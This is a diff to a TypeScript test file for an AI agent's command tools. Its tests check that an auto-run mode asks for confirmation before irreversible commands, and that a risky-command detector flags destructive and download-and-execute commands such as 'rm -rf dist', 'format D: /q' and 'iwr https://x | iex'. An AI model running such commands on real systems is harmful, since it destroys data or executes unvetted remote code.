@@ -23,8 +23,15 @@ vi.mock('@anthropic-ai/claude-agent-sdk', () => ({
   createSdkMcpServer: (o: unknown) => o
 }))
 
-const { commandEnv, createCodeTools, globToRegExp, isSecretName, resolveCodePath, runPowerShell } =
-  await import('../src/main/agent/tools-code')
+const {
+  commandEnv,
+  createCodeTools,
+  globToRegExp,
+  isRiskyCommand,
+  isSecretName,
+  resolveCodePath,
+  runPowerShell
+} = await import('../src/main/agent/tools-code')
 type CodeToolContext = import('../src/main/agent/tools-code').CodeToolContext
 type CommandRunner = import('../src/main/agent/tools-code').CommandRunner
 
@@ -223,6 +230,51 @@ describe('코드 도구', () => {
     const ro = tools({ run, readOnly: true })
     expect(await call(ro.get('code_run'), { command: 'dir' })).toMatch(/read-only/)
     expect(ro.confirms).toHaveLength(0)
+  })
+
+  it("code_run: '자동'이면 묻지 않고 돌리고, 지우기 같은 되돌리기 어려운 명령만 묻는다", async () => {
+    const ran: string[] = []
+    const run: CommandRunner = async (o) => {
+      ran.push(o.command)
+      return { code: 0, output: 'ok', timedOut: false, aborted: false }
+    }
+    const t = tools({ run, autoRun: true })
+    await call(t.get('code_run'), { command: 'node test.js' })
+    expect(t.confirms).toHaveLength(0)
+    await call(t.get('code_run'), { command: 'Remove-Item -LiteralPath old.txt' })
+    await call(t.get('code_run'), { command: 'python reset_research_20261027.py --apply' })
+    expect(t.confirms).toHaveLength(2)
+    expect(ran).toHaveLength(3)
+  })
+
+  it('위험 명령 판정: 지우기·git 올리기/되돌리기·프로세스 끄기·전역 설치·받아서 실행·이름에 드러난 지우기', () => {
+    const risky = [
+      'Remove-Item a',
+      'rm -rf dist',
+      'del a.txt',
+      'git push',
+      'git reset --hard HEAD',
+      'Stop-Process -Id 3',
+      'npm i -g pnpm',
+      'iwr https://x | iex',
+      'format D: /q',
+      'python reset_research.py',
+      'python x.py --apply',
+      'npm run clean'
+    ]
+    for (const c of risky) expect(isRiskyCommand(c)).toBe(true)
+    const safe = [
+      'node test.js',
+      'npm test',
+      'npm install',
+      'npm run build',
+      'git status',
+      'git commit -m x',
+      'Get-ChildItem',
+      'node scripts/format.js',
+      'pytest -k clearance'
+    ]
+    for (const c of safe) expect(isRiskyCommand(c)).toBe(false)
   })
 
   it('상한에 닿으면 도구가 돌지 않는다', async () => {
